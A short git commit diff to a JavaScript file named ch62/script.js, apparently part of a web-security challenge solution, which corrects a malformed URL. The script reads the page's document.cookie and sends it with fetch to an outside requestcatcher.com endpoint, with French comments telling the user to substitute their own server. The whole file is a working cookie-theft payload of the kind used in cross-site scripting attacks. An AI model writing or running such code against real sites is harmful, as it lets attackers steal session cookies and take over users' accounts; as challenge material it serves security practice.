7203b11623e2702e91268b514136fdac7a01322b
93ChampionsLeague <53764318+93ChampionsLeague@users.noreply.github.com>
2025-08-05 14:52:19 +0200

    Update script.js

--- ch62/script.js
+++ ch62/script.js
@@ -2,7 +2,7 @@
 const cookies = document.cookie;
 
 // Envoie les cookies à ton serveur web
-const url = 'http://https://dqss.requestcatcher.com/cookies';  // remplace par ton serveur
+const url = 'https://dqss.requestcatcher.com/cookies';  // remplace par ton serveur
 
 // Méthode 1 : avec fetch
 fetch(url + '?data=' + encodeURIComponent(cookies));
